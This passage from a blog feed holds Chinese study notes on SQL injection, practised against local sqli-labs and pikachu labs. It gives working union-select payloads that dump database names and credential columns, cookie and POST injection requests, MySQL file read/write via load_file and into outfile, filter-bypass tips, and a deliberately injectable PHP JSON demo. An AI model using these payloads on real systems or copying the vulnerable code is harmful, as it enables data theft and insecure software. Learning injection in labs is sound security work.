        <content type="html"><![CDATA[<p>😆😆😆😆😆😆</p><span id="more"></span><h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>在真实 SQL 注入安全测试中，我们一定要先明确提交数据及提交方法后再进行注入，其中提交数据类型和提交方法可以通过抓包分析获取，后续安全测试中我们也必须满足同等的操作才能进行注入。</p><p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211104686.png" alt="image-20210826171130322"></p><h3 id="简要明确参数类型"><a href="#简要明确参数类型" class="headerlink" title="简要明确参数类型"></a>简要明确参数类型</h3><p>数字，字符，搜索，JSON 等</p><h4 id="数字型"><a href="#数字型" class="headerlink" title="数字型"></a>数字型</h4><p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211104698.png" alt="image-20210826171444372"></p><p>可以看到<code>id=1</code>，是数字型</p><h4 id="字符型"><a href="#字符型" class="headerlink" title="字符型"></a>字符型</h4><p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211104702.png" alt="image-20210826171553422"></p><p> <code>email_id =&#39;Dumb@dhakkan.com&#39;</code>我们必须用’或者’’包裹，否则会报错，因为他是字符型。</p><h4 id="例如"><a href="#例如" class="headerlink" title="例如"></a>例如</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">$name = $_GET[&#x27;x&#x27;]</span><br><span class="line">$sql = &quot;select * from user where name = &#x27;$name&#x27;&quot;</span><br><span class="line">我们如果要注入就必须这样写</span><br><span class="line">?x=xiaodi&#x27; and 1=1 --+正确</span><br><span class="line">?x=xiaodi&#x27; and 1=1 --+错误</span><br><span class="line">带到数据库中</span><br><span class="line">$sql =&quot; select * from user where name = &#x27;xiaodi&#x27; and 1=1 --+&#x27;&quot; 正确</span><br><span class="line">$sql =&quot; select * from user where name = &#x27;xiaodi and 1=1 --+&#x27;&quot; 错误</span><br></pre></td></tr></table></figure><h4 id="干扰符号"><a href="#干扰符号" class="headerlink" title="干扰符号"></a>干扰符号</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">一般是&#x27;,&quot;,%,),&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">id</span><br><span class="line">&#x27;id&#x27;</span><br><span class="line">&quot;id&quot;</span><br><span class="line">(&#x27;id&#x27;)</span><br><span class="line">(&quot;id&quot;)</span><br><span class="line">&quot;&#x27;id&#x27;&quot;</span><br><span class="line">(&quot;&#x27;id&#x27;&quot;)</span><br><span class="line">(&#x27;&quot;id&quot;&#x27;)</span><br><span class="line">&#x27;%id%&#x27;</span><br><span class="line">......</span><br></pre></td></tr></table></figure><h3 id="简要明确请求方法"><a href="#简要明确请求方法" class="headerlink" title="简要明确请求方法"></a>简要明确请求方法</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GET,POST,COOKIE,REQUEST,HTTP 头等</span><br></pre></td></tr></table></figure><p>可以在network中查看</p><p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211104704.png" alt="image-20210826172933628"></p><h4 id="GET请求"><a href="#GET请求" class="headerlink" title="GET请求"></a>GET请求</h4><p>直接在浏览器后面添加参数就可以</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/?id=1</span><br></pre></td></tr></table></figure><h4 id="POST请求"><a href="#POST请求" class="headerlink" title="POST请求"></a>POST请求</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">需要通过POST请求来写入参数</span><br></pre></td></tr></table></figure><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211104533.png" alt="image-20210826173620822" style="zoom:67%;" /><h4 id="cookie"><a href="#cookie" class="headerlink" title="cookie"></a>cookie</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">需要将cookie写入请求头中才可以传递</span><br><span class="line">cookie:c=xxxxx</span><br></pre></td></tr></table></figure><h4 id="REQUEST请求"><a href="#REQUEST请求" class="headerlink" title="REQUEST请求"></a>REQUEST请求</h4><p> REQUEST 全部接收，网站在访问的时候由于我们大多数是黑盒测试，不知道对方代码写法，如果对方采用REQUEST接收方式，就不需要考虑用何种方法去提交，因为用GET、POST都可以。如果对方是单一接收方式，那么在注入的时候需要用它的方法去注入。</p><h4 id="SERVER"><a href="#SERVER" class="headerlink" title="$_SERVER"></a>$_SERVER</h4><p>$_SERVER是PHP里内置变量，全局变量，PHP写脚本时用它来获取系统的值，在数据包的某一个地方可以进行注入</p><p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211104462.png" alt="image-20210826174348974"></p><h3 id="JSON注入相关知识"><a href="#JSON注入相关知识" class="headerlink" title="JSON注入相关知识"></a>JSON注入相关知识</h3><h4 id="JSON基础"><a href="#JSON基础" class="headerlink" title="JSON基础"></a>JSON基础</h4><p>简介</p><p>JSON 是存储和交换文本信息的语法，是轻量级的文本数据交换格式。类似xml，但JSON 比 XML 更小、更快，更易解析。所以现在接口数据传输都采用json方式进行。JSON 文本的 MIME 类型是 “application/json”</p><p>JSON语法</p><ul><li>数据在名称/值对中</li><li>数据由逗号分隔</li><li>大括号保存对象</li><li>中括号保存数组</li></ul><p>JSON值</p><ul><li>数字（整数或浮点数） {“age”:30 }</li><li>字符串（在双引号中） {“uname”:”yang”}</li><li>逻辑值（true 或 false） {“flag”:true }</li><li>数组（在中括号中）{“sites”:[{“name”:”yang”},{“name”:”ming”}]}</li><li>对象（在大括号中）JSON 对象在大括号（{}）中书写：</li><li>null  { “runoob”:null }</li></ul><p>JSON代码格式</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  &quot;users&quot;: &#123;</span><br><span class="line">    &quot;user&quot;: [</span><br><span class="line">      &#123;</span><br><span class="line">        &quot;id&quot;: &quot;1&quot;,</span><br><span class="line">        &quot;username&quot;: &quot;admin&quot;,</span><br><span class="line">        &quot;passwd&quot;: &quot;admin888&quot;</span><br><span class="line">      &#125;,</span><br><span class="line">      &#123;</span><br><span class="line">        &quot;id&quot;: &quot;2&quot;,</span><br><span class="line">        &quot;username&quot;: &quot;root&quot;,</span><br><span class="line">        &quot;passwd&quot;: &quot;root123&quot;</span><br><span class="line">      &#125;,</span><br><span class="line">      &#123;</span><br><span class="line">        &quot;id&quot;: &quot;3&quot;,</span><br><span class="line">        &quot;username&quot;: &quot;system&quot;,</span><br><span class="line">        &quot;passwd&quot;: &quot;system456&quot;</span><br><span class="line">      &#125;</span><br><span class="line">    ]</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="JSON注入"><a href="#JSON注入" class="headerlink" title="JSON注入"></a>JSON注入</h4><p>JSON注入是指应用程序所解析的JSON数据来源于不可信赖的数据源，程序没有对这些不可信赖的数据进行验证、过滤，如果应用程序使用未经验证的输入构造 JSON，则可以更改 JSON 数据的语义。在相对理想的情况下，攻击者可能会插入无关的元素，导致应用程序在解析 JSON数据时抛出异常。</p><h3 id="演示案例："><a href="#演示案例：" class="headerlink" title="演示案例："></a>演示案例：</h3><h4 id="参数字符型注入测试"><a href="#参数字符型注入测试" class="headerlink" title="参数字符型注入测试"></a>参数字符型注入测试</h4><h5 id="less5"><a href="#less5" class="headerlink" title="less5"></a>less5</h5><p>单引号闭合</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/sqli/Less-5/?id=3&#x27; order by 3 --+</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211104487.png" alt="image-20210826200648215"></p><h5 id="less6"><a href="#less6" class="headerlink" title="less6"></a>less6</h5><p>双引号闭合</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/sqli/Less-6/?id=3&quot; and 1=1--+</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211104559.png" alt="image-20210826200804673"></p><h4 id="POST-数据提交注入测试"><a href="#POST-数据提交注入测试" class="headerlink" title="POST 数据提交注入测试"></a>POST 数据提交注入测试</h4><h5 id="less11"><a href="#less11" class="headerlink" title="less11"></a>less11</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=admin&#x27; and 1=2 #&amp;passwd=admin&amp;submit=Submit</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211104563.png" alt="image-20210826201256873"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=admin&#x27; and 1=1 #&amp;passwd=admin&amp;submit=Submit</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211104014.png" alt="image-20210826201313639"></p><p> 参数 JSON 数据注入测试=&gt;本地环境代码演示</p><h4 id="COOKIE-数据提交注入测试"><a href="#COOKIE-数据提交注入测试" class="headerlink" title="COOKIE 数据提交注入测试"></a>COOKIE 数据提交注入测试</h4><p>需要先登录，然后进行cookie注入</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">GET /sqli/Less-20/index.php HTTP/1.1</span><br><span class="line">Host: 127.0.0.1</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:91.0) Gecko/20100101 Firefox/91.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Referer: http://127.0.0.1/sqli/Less-20/</span><br><span class="line">Connection: close</span><br><span class="line">Cookie: uname=admi&#x27; union select 1,database(),3#; csrftoken=vKkecYAHNQy0hBzIqkW7oaJw91c8w1DPtQhCAWIXKPPgjuxTF3uii1r7lXPlDHeL</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Sec-Fetch-Dest: document</span><br><span class="line">Sec-Fetch-Mode: navigate</span><br><span class="line">Sec-Fetch-Site: same-origin</span><br><span class="line">Sec-Fetch-User: ?1</span><br><span class="line">Cache-Control: max-age=0</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211104602.png" alt="image-20210826203427162"></p><h4 id="HTTP-头部参数数据注入测试"><a href="#HTTP-头部参数数据注入测试" class="headerlink" title="HTTP 头部参数数据注入测试"></a>HTTP 头部参数数据注入测试</h4><p>UA头注入</p><p>闭合掉前面的，使用报错注入</p><h4 id="配合-sqlilabs-本地数据库演示"><a href="#配合-sqlilabs-本地数据库演示" class="headerlink" title="配合 sqlilabs 本地数据库演示"></a>配合 sqlilabs 本地数据库演示</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">header(&#x27;content-type:text/html;charset=utf-8&#x27;);</span><br><span class="line">if(isset($_POST[&#x27;json&#x27;]))&#123;</span><br><span class="line">$json_str=$_POST[&#x27;json&#x27;];</span><br><span class="line">$json=json_decode($json_str);</span><br><span class="line">if(!$json)&#123;</span><br><span class="line">die(&#x27;JSON 文档格式有误，请检查&#x27;);</span><br><span class="line">&#125;</span><br><span class="line">$username=$json-&gt;username;</span><br><span class="line">//$passwd=$json-&gt;passwd;</span><br><span class="line">$mysqli=new mysqli();</span><br><span class="line">$mysqli-&gt;connect(&#x27;localhost&#x27;,&#x27;root&#x27;,&#x27;root&#x27;);</span><br><span class="line">if($mysqli-&gt;connect_errno)&#123;</span><br><span class="line">die(&#x27;数据库连接失败：&#x27;.$mysqli-&gt;connect_error);</span><br><span class="line">&#125;</span><br><span class="line">$mysqli-&gt;select_db(&#x27;security&#x27;);</span><br><span class="line">if($mysqli-&gt;errno)&#123;</span><br><span class="line">dir(&#x27;打开数据库失败：&#x27;.$mysqli-&gt;error);</span><br><span class="line">&#125;</span><br><span class="line">$mysqli-&gt;set_charset(&#x27;utf-8&#x27;);</span><br><span class="line">$sql=&quot;SELECT * FROM users WHERE username=&#x27;&#123;$username&#125;&#x27;&quot;;</span><br><span class="line">echo $sql;</span><br><span class="line">$result=$mysqli-&gt;query($sql);</span><br><span class="line">if(!$result)&#123;</span><br><span class="line">die(&#x27;执行 SQL 语句失败：&#x27;.$mysqli-&gt;error);</span><br><span class="line">&#125;else if($result-&gt;num_rows==0)&#123;</span><br><span class="line">die(&#x27;查询结果为空&#x27;);</span><br><span class="line">&#125;else &#123;</span><br><span class="line">$array1=$result-&gt;fetch_all(MYSQLI_ASSOC);</span><br><span class="line">echo &quot;用户名：&#123;$array1[0][&#x27;username&#x27;]&#125;,密码：&#123;$array1[0][&#x27;password&#x27;]&#125;&quot;;</span><br><span class="line">&#125;</span><br><span class="line">$result-&gt;free();</span><br><span class="line">$mysqli-&gt;close();</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> Web </tag>
            
            <tag> 小迪学习笔记 </tag>
            
            <tag> SQL注入 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>13WEB漏洞--SQL注入之MYSQL注入</title>
      <link href="/2021/09/21/13WEB%E6%BC%8F%E6%B4%9E-SQL%E6%B3%A8%E5%85%A5%E4%B9%8BMYSQL%E6%B3%A8%E5%85%A5/"/>
      <url>/2021/09/21/13WEB%E6%BC%8F%E6%B4%9E-SQL%E6%B3%A8%E5%85%A5%E4%B9%8BMYSQL%E6%B3%A8%E5%85%A5/</url>
      
        <content type="html"><![CDATA[<p>😆😆😆😆😆😆</p><span id="more"></span><h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>MYSQL 注入中首先要明确当前注入点权限，高权限注入时有更多的攻击手法，有的能直接进行 getshell 操作。其中也会遇到很多阻碍，相关防御方案也要明确，所谓知己知彼,百战不殆。不论作为攻击还是防御都需要了解其中的手法和原理，这样才是一个合格的安全工作者。</p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211103519.png" alt="image-20210825194532989" style="zoom:80%;" /><h3 id="高权限注入"><a href="#高权限注入" class="headerlink" title="高权限注入"></a>高权限注入</h3><h4 id="检查权限"><a href="#检查权限" class="headerlink" title="检查权限"></a>检查权限</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1 union select 1,user(),3</span><br></pre></td></tr></table></figure><p>如果是root则为高权限，高权限用户可以跨库注入，普通用户只能注入自己的数据库。</p><p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211103522.png" alt="image-20210825195241184"></p><p>权限在这里设置</p><h3 id="跨库查询及应用思路"><a href="#跨库查询及应用思路" class="headerlink" title="跨库查询及应用思路"></a>跨库查询及应用思路</h3><p>information_schema 表特性，记录库名，表名，列名对应表</p><h4 id="获取所有数据库名："><a href="#获取所有数据库名：" class="headerlink" title="获取所有数据库名："></a>获取所有数据库名：</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/sqli/Less-2/?id=-1 union select 1,group_concat(schema_name),3 from information_schema.schemata --+</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211103116.png" alt="image-20210825200634317"></p><h4 id="获取指定-pikachu数据库名下的表名信息："><a href="#获取指定-pikachu数据库名下的表名信息：" class="headerlink" title="获取指定 pikachu数据库名下的表名信息："></a>获取指定 pikachu数据库名下的表名信息：</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/sqli/Less-2/?id=-1 union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=&#x27;pikachu&#x27; --+</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211103868.png" alt="image-20210825201033697"></p><h4 id="获取指定pikachu下的表名-users-下的列名信息："><a href="#获取指定pikachu下的表名-users-下的列名信息：" class="headerlink" title="获取指定pikachu下的表名 users 下的列名信息："></a>获取指定pikachu下的表名 users 下的列名信息：</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/sqli/Less-2/?id=-1 union select 1,group_concat(column_name),3 from information_schema.columns where table_name=&#x27;users&#x27; and table_schema=&#x27;pikachu&#x27; --+</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211103705.png" alt="image-20210825201433321"></p><h4 id="获取指定-pikachu下的-users-数据"><a href="#获取指定-pikachu下的-users-数据" class="headerlink" title="获取指定 pikachu下的 users 数据"></a>获取指定 pikachu下的 users 数据</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/sqli/Less-2/?id=-1 union select 1,group_concat(concat_ws(0x7e,username,password)),3 from pikachu.users--+</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211103871.png" alt="image-20210825201558670"></p><h3 id="文件读写操作"><a href="#文件读写操作" class="headerlink" title="文件读写操作"></a>文件读写操作</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">load_file()：读取函数</span><br><span class="line">into outfile 或 into dumpfile ：导出函数</span><br><span class="line"></span><br><span class="line">select load_file(&#x27;D:\\phpStudy\\WWW\\sqli\\Less-7\\test.txt&#x27;);</span><br><span class="line">select &#x27;crow&#x27; into outfile &#x27;D:\\phpStudy\\WWW\\sqli\\Less-7\\test.txt&#x27;; 写入内容为crow</span><br></pre></td></tr></table></figure><h3 id="路径获取常见方法："><a href="#路径获取常见方法：" class="headerlink" title="路径获取常见方法："></a>路径获取常见方法：</h3><p>报错显示，遗留文件，漏洞报错，平台配置文件，爆破等</p><h4 id="windows一般路径"><a href="#windows一般路径" class="headerlink" title="windows一般路径:"></a>windows一般路径:</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">d:/wwwroot/xiaodi8/</span><br></pre></td></tr></table></figure><h4 id="linux一般路径"><a href="#linux一般路径" class="headerlink" title="linux一般路径:"></a>linux一般路径:</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/var/www/xiaodi8</span><br></pre></td></tr></table></figure><h3 id="常见读取文件列表："><a href="#常见读取文件列表：" class="headerlink" title="常见读取文件列表："></a>常见读取文件列表：</h3><p>常见写入文件问题：魔术引号开关</p><p>magic_quotes_gpc函数在php中的作用是判断解析用户提示的数据，如包括有:post、get、cookie过来的数据增加转义字符“\”，以确保这些数据不会引起程序，特别是数据库语句因为特殊字符引起的污染而出现致命的错误。</p><p>在magic_quotes_gpc=On的情况下，如果输入的数据有单引号（’）、双引号（”）、反斜线（）与 NUL（NULL 字符）等字符都会被加上反斜线。这些转义是必须的，如果这个选项为off，那么我们就必须调用addslashes这个函数来为字符串增加转义。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">magic_quotes_gpc</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211103378.png" alt="image-20210825203715912"></p><h4 id="魔术引号及常见防护"><a href="#魔术引号及常见防护" class="headerlink" title="魔术引号及常见防护"></a>魔术引号及常见防护</h4><h4 id="编码或宽字节绕过："><a href="#编码或宽字节绕过：" class="headerlink" title="编码或宽字节绕过："></a>编码或宽字节绕过：</h4><p>比如在sqlmap中添加–temper脚本参数转码或者使用转换工具</p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211103565.png" alt="image-20210825203919068" style="zoom:67%;" /><p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211103340.png" alt="image-20210825203933981"></p><p>addslashes() 函数返回在预定义字符之前添加反斜杠的字符串。</p><p>预定义字符是：</p><ul><li>单引号（’）</li><li>双引号（”）</li><li>反斜杠（\）</li><li>NULL</li></ul><h4 id="防护"><a href="#防护" class="headerlink" title="防护"></a>防护</h4><p>自带防御：魔术引号</p><p>内置函数：int、addslashes() 函数等</p><p>纯数字过滤饶过不了</p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211104801.png" alt="image-20210825204255831" style="zoom:80%;" /><p>关键字过滤</p><p>将select替换为fuck,这种可以通过大小写绕过。</p><p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211103377.png" alt="image-20210825204910361"></p><p>WAF防护软件</p><p>安全狗、宝塔等</p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211104599.png" alt="image-20210825205307043" style="zoom:80%;" /><h4 id="低版本注入配合读取或暴力"><a href="#低版本注入配合读取或暴力" class="headerlink" title="低版本注入配合读取或暴力"></a>低版本注入配合读取或暴力</h4><p>字典或读取</p><h3 id="涉及资源："><a href="#涉及资源：" class="headerlink" title="涉及资源："></a>涉及资源：</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://blog.csdn.net/weixin_30292843/article/details/99381669</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> Web </tag>
            
            <tag> 小迪学习笔记 </tag>
            
            <tag> SQL注入 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>12WEB漏洞--SQL注入之简要SQL注入</title>
      <link href="/2021/09/21/12WEB%E6%BC%8F%E6%B4%9E-SQL%E6%B3%A8%E5%85%A5%E4%B9%8B%E7%AE%80%E8%A6%81SQL%E6%B3%A8%E5%85%A5/"/>
      <url>/2021/09/21/12WEB%E6%BC%8F%E6%B4%9E-SQL%E6%B3%A8%E5%85%A5%E4%B9%8B%E7%AE%80%E8%A6%81SQL%E6%B3%A8%E5%85%A5/</url>
      
        <content type="html"><![CDATA[<p>😆😆😆😆😆😆</p><span id="more"></span><h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>在本系列课程学习中，SQL 注入漏洞将是重点部分，其中 SQL 注入又非常复杂，区分各种数据库类型，提交方法，数据类型等注入，我们需要按部就班的学习，才能学会相关 SQL 注入的核心。同样此类漏洞是WEB 安全中严重的安全漏洞，学习如何利用，挖掘，修复也是很重要的。</p><h3 id="SQL原理"><a href="#SQL原理" class="headerlink" title="SQL原理"></a>SQL原理</h3><p>SQL注入是一种解释性语言，如果程序与用户进行交互。用户就可以构造特殊的输入来拼接到程序中执行，从而使得程序依据用户输入执行有可能存在恶意行为的代码。</p><h3 id="SQL产生条件："><a href="#SQL产生条件：" class="headerlink" title="SQL产生条件："></a>SQL产生条件：</h3><ul><li>必须可以进行输入</li><li>输入的内容必须要与数据库进行交互</li></ul><h3 id="SQL注入的分类"><a href="#SQL注入的分类" class="headerlink" title="SQL注入的分类"></a>SQL注入的分类</h3><ul><li>从注入手法分类可以分为：联合查询注入、报错型注入、布尔型注入、延时注入、堆叠注入</li><li>从数据类型上可以分为：字符型（即输入的输入使用符号进行过滤）、数值型（即输入的输入未使用符号进行过滤）</li><li>从注入位置可以分类为：GET数据（提交数据方式为GET，大多存在地址栏）、POST数据（提交数据方式为POST，大多存在输入框中）、HTTP头部（提交数据方式为HTTP头部）、cookie数据（提交数据方式为cookie）</li></ul><h3 id="SQL注入安全测试中危害"><a href="#SQL注入安全测试中危害" class="headerlink" title="SQL注入安全测试中危害"></a>SQL注入安全测试中危害</h3><ul><li>网站权限</li><li>数据库数据</li></ul><p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211103956.png" alt="image-20210824195601166"></p><h3 id="MYSQL数据库"><a href="#MYSQL数据库" class="headerlink" title="MYSQL数据库"></a>MYSQL数据库</h3><p>注入顺序</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">数据库A=网站A</span><br><span class="line">表名</span><br><span class="line">列名</span><br><span class="line">数据</span><br><span class="line">数据库B=网站B</span><br><span class="line">.........</span><br><span class="line">数据库C=网站C</span><br><span class="line">..........</span><br></pre></td></tr></table></figure><h3 id="如何判断注入点"><a href="#如何判断注入点" class="headerlink" title="如何判断注入点"></a>如何判断注入点</h3><h4 id="老办法"><a href="#老办法" class="headerlink" title="老办法"></a>老办法</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">and 1=1 页面正常</span><br><span class="line">and 1=2 页面错误</span><br><span class="line">可能存在注入点</span><br><span class="line"></span><br><span class="line">解释</span><br><span class="line"></span><br><span class="line">select * from users where id=1 and 1=1 limit 0,1 正常</span><br><span class="line">select * from users where id=1 and 1=2 limit 0,1 错误</span><br><span class="line"></span><br><span class="line">前提:select * from users where id=1</span><br><span class="line">若:1=1 真真且真=真</span><br><span class="line">若:1=2 假真且假=假</span><br><span class="line">不可以用or判断</span><br></pre></td></tr></table></figure><h4 id="好用的！！"><a href="#好用的！！" class="headerlink" title="好用的！！"></a>好用的！！</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">select * from users where id=1</span><br><span class="line">最后我们测试都是在id后面加东西,然后id带入数据库进行查询,所有我们这里可以随便输入,当数据库没有这个id,页面就会改变.</span><br><span class="line">例如:id=1西瓜,如果页面改变说明有注入,如果没有改变说明id本身没有被带入数据库中进行查询。</span><br><span class="line"></span><br><span class="line">例外:</span><br><span class="line">如果你输入错误网站会报404,,进行跳转.此类网站有防护,基本没有注入。</span><br></pre></td></tr></table></figure><h3 id="必要知识点"><a href="#必要知识点" class="headerlink" title="必要知识点"></a>必要知识点</h3><h4 id="1、information-chema"><a href="#1、information-chema" class="headerlink" title="1、information_chema"></a>1、information_chema</h4><ul><li>在Mysql 5.0以上的版本中，默认定义了information_schema数据库，用来存储数据库元信息，其中具有表schemata(数据库名),tables(表明),columns(列名或字段名)</li><li>在schemata表中，schema_name字段用来存储数据库名，</li><li>在tables表中，table_schema和table_name分别用来存储数据库名和表名。</li><li>在columns表中，table_schema(数据库名),table_name(表名),column_name(字段名)</li></ul><h4 id="2、数据库中的”-”"><a href="#2、数据库中的”-”" class="headerlink" title="2、数据库中的”.”"></a>2、数据库中的”.”</h4><p>数据库中符号”.”代表下一级，如xiao.user表示xiao数据库中的user表名</p><h3 